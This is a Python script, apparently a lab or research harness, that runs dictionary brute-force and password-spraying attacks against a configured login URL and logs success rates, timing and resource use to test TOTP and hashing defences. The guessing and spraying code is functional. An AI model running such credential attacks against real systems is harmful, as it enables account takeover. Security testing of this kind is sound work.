import requests
import json
import time
from analytics import measure_resources

data = {}
with open("client.config", "r") as f:
    data = json.load(f)
try:
    LOGIN_URL = data["LOGIN_URL"]
    PASSWORDS_FILE = data["PASSWORDS_FILE"]
    USERS_JSON = data["USERS_JSON"]
    MAX_ATTEMPTS_PER_USER = data["MAX_ATTEMPTS_PER_USER"]
    MAX_ATTEMPTS_PER_SESSION = data["MAX_ATTEMPTS_PER_SESSION"]
    TIME_LIMIT = data["TIME_LIMIT"]  # in seconds
    hash_modes = data["HASH_MODES"]
except:
    print("Error loading config file")

session = requests.Session()


def load_words(path, limit=10000):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [w.strip() for w in f if w.strip()][:limit]


def password_generator(words):
    count = 0

    for w in words:
        yield w
        count += 1
        if count >= MAX_ATTEMPTS_PER_USER:
            return

    for w1 in words:
        for w2 in words:
            yield w1 + w2
            count += 1
            if count >= MAX_ATTEMPTS_PER_USER:
                return
    for w1 in words:
        for w2 in words:
            for w3 in words:
                yield w1 + w2 + w3
                count += 1
                if count >= MAX_ATTEMPTS_PER_USER:
                    return


def try_login(username, password, hash_mode):
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "username": username,
                "password": password,
                "hash_mode": hash_mode
            }
        )
        return "totp" in response.text.lower() or "totp" in response.url

    except requests.RequestException as e:
        print("ERROR occured in the server:" + str(e))
        return False


def bruteforce(username, hash_mode):
    words = load_words(PASSWORDS_FILE)
    tries = 0
    start = time.time()
    for password in password_generator(words):
        if try_login(username, password, hash_mode):
            return True, tries
        tries += 1
        if (time.time() - start) >= TIME_LIMIT:
            return False, tries
    return False, tries


def get_user_list():
    user_list = []
    with open(USERS_JSON, "r") as f:
        data = json.load(f)
    for user in data['users']:
        user_list.append(user['username'])
    user_list = user_list[:5]
    return user_list


@measure_resources(interval=0.01)
def password_spraying(hash_mode):
    successful_cracks = {}
    tries = 0
    users = get_user_list()
    start = time.time()
    words = load_words(PASSWORDS_FILE)
    pass_start = time.time()
    for password in password_generator(words):
        for user in users:
            tries += 1
            if try_login(user, password, hash_mode):
                successful_cracks[user] = time.time() - pass_start
                users.remove(user)
                break
        # check if time limit or tries limit were exceeded
        if tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) >= TIME_LIMIT:
            break
    print(successful_cracks)
    end = time.time() - start
    user_entries = []
    for user in get_user_list():
        if user in successful_cracks.keys():
            user_entry = {"Username": user, "Time_elapsed": round(successful_cracks[user], 2),
                          "Status": "Success But Totp Block"}
        else:
            user_entry = {"Username": user, "Time_elapsed": round(end, 2), "Status": "Fail"}
        user_entries.append(user_entry)

    return tries, end, len(successful_cracks), user_entries


@measure_resources(interval=0.01)
def preform_bruteforce(hash_mode):
    total_tries = 0
    count_success = 0
    start = time.time()
    user_entries = []

    for user in get_user_list():
        print(f"Testing user: {user}")
        user_start = time.time()
        success, tries = bruteforce(user, hash_mode)
        user_end = time.time() - user_start
        status = "Success" if success else "Fail"

        user_entry = {
            "Username": user,
            "Time_elapsed": round(user_end, 2),
            "Status": status
        }
        user_entries.append(user_entry)
        # add the actual tries, regardless of success or failure
        total_tries += tries
        if success:
            count_success += 1

        # limits
        if total_tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) >= TIME_LIMIT:
            break

    end = time.time() - start
    return total_tries, end, count_success, user_entries


def main():
    with open("TOTP_DEF.json", "w") as file:
        full_json = {}

        for curr_hash in hash_modes[:1]:
            # preform bruteforce on the current hash encryption method
            result, avg_cpu, avg_mem = preform_bruteforce(curr_hash)
            # also add analytics
            total_tries, end, count_success, user_entries = result
            brute_json = {"Total_tries": total_tries,
                          "Time_elapsed": round(end, 3),
                          "Tries_per_sec": int(total_tries / end),
                          "Success_rate": round((count_success / len(get_user_list()) * 100), 2),
                          "average_cpu_use": round(avg_cpu, 2),
                          "average_mem_use": round(avg_mem, 2),
                          "User_entries": user_entries}

            # preform password spraying on the current hash encryption method
            result, avg_cpu, avg_mem = password_spraying(curr_hash)
            total_tries, end, count_success, user_entries = result
            spray_json = {"Total_tries": total_tries,
                          "Time_elapsed": round(end, 3),
                          "Tries_per_sec": int(total_tries / end),
                          "Success_rate": round((count_success / len(get_user_list()) * 100), 2),
                          "average_cpu_use": round(avg_cpu, 2),
                          "average_mem_use": round(avg_mem, 2),
                          "User_entries": user_entries}
            crack_json = {"Bruteforce": brute_json, "Password_spraying": spray_json}
            full_json[curr_hash] = crack_json
        file.write(json.dumps(full_json, indent=4))
        print(json.dumps(full_json,indent=4))


if __name__ == "__main__":
    main()
